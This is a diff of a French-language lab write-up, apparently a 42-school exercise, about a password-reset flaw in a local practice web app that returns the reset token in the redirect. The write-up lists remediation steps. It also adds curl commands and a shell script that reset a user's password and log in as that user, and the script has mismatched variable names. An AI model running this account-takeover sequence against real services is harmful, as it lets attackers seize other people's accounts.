@@ -1,3 +1,4 @@
+# Rest password
 
 ## Reproduire la faille:
 
@@ -12,10 +13,10 @@ On peut alors modifier le mot de passe de cet utilisateur, par 'Qwerty1234!' par
 
 De retour sur la page de connexion:
 
-   ```
-   email: jdoe@student.42.tech
-   Mot de passe: Qwerty1234!
-   ```
+```
+email: jdoe@student.42.tech
+Mot de passe: Qwerty1234!
+```
 
 Ces identifiants fonctionnent desormais.
 
@@ -27,31 +28,65 @@ Note: Le reset password fonctionne aussi pour un email aleatoire qui n'existe pa
 
 Sur la page 'Reset password', lorsque l'on envoie un requete de reinitialisation de mot de passe, par exemple pour l'email "email=jdoe@student.42.tech"
 
-   ```
-   curl -si -X POST 'http://localhost:4942/reset-password/request' \
-     --data-urlencode 'email=jdoe@student.42.tech'
-   ```
+```shell
+target='127.0.0.1:4942'
+
+curl -si -X POST "http://$target/reset-password/request" \
+  --data-urlencode 'email=jdoe@student.42.tech'
+```
 
 On recoit la reponse suivante:
 
-   ```
-   HTTP/1.1 302 Found
-   location: /reset-password?email=jdoe@student.42.tech&token=5ae99e7ca0a3fd84337cecfa705f5321
-   ```
+```
+HTTP/1.1 302 Found
+location: /reset-password?email=jdoe@student.42.tech&token=5ae99e7ca0a3fd84337cecfa705f5321
+```
 
 On recoit donc le token de reinitialisation de mot de passe directement !
 On peut donc se servir de cette faille pour surcharger et modifier le mot de passe de ce compte:
 
-   ```
-   curl -si -X POST 'http://localhost:4942/reset-password/confirm' \
-     --data-urlencode 'email=jdoe@student.42.tech' \
-     --data-urlencode 'token=5ae99e7ca0a3fd84337cecfa705f5321' \
-     --data-urlencode 'new_password=Qwerty1234!'
-   ```
+```shell
+reset_token='5ae99e7ca0a3fd84337cecfa705f5321'
 
+curl -si -X POST "http://$target/reset-password/confirm" \
+  --data-urlencode 'email=jdoe@student.42.tech' \
+  --data-urlencode "token=$reset_token" \
+  --data-urlencode 'new_password=Qwerty1234!'
+```
 
 # Solutions:
 
 - Mettre une limite de tentative pour `/reset-password/request`
 - Ne pas mettre le token dans la reponse
 - Envoyer un lien de reinitialisation par mail plutot que de demander directement le nouveau mot de passe.
+
+## shell
+
+
+```shell
+# set var
+target='127.0.0.1:4942'
+target_email='jdoe@student.42.tech'
+wanted_password='Qwerty1!'
+
+# reset password flow for jdoe (see forum post)
+curl -si -X POST "http://$host/reset-password/request" \
+  --data-urlencode 'email=jdoe@student.42.tech'
+
+# set token from response
+reset_token=5ae99e7ca0a3fd84337cecfa705f5321
+
+# create new password
+curl -si -X POST "http://$target/reset-password/confirm" \
+  --data-urlencode "email=$target_email" \
+  --data-urlencode "token=$reset_token" \
+  --data-urlencode "new_password=$wanted_password"
+
+# authenticate and store cookie
+cookie_file='cookies_jdoe.txt'
+
+curl -si -X POST "http://$target/login" \
+  --data-urlencode "identity=$target_email" \
+  --data-urlencode "password=$wanted_password" \
+  -c "$cookies_file"
+```
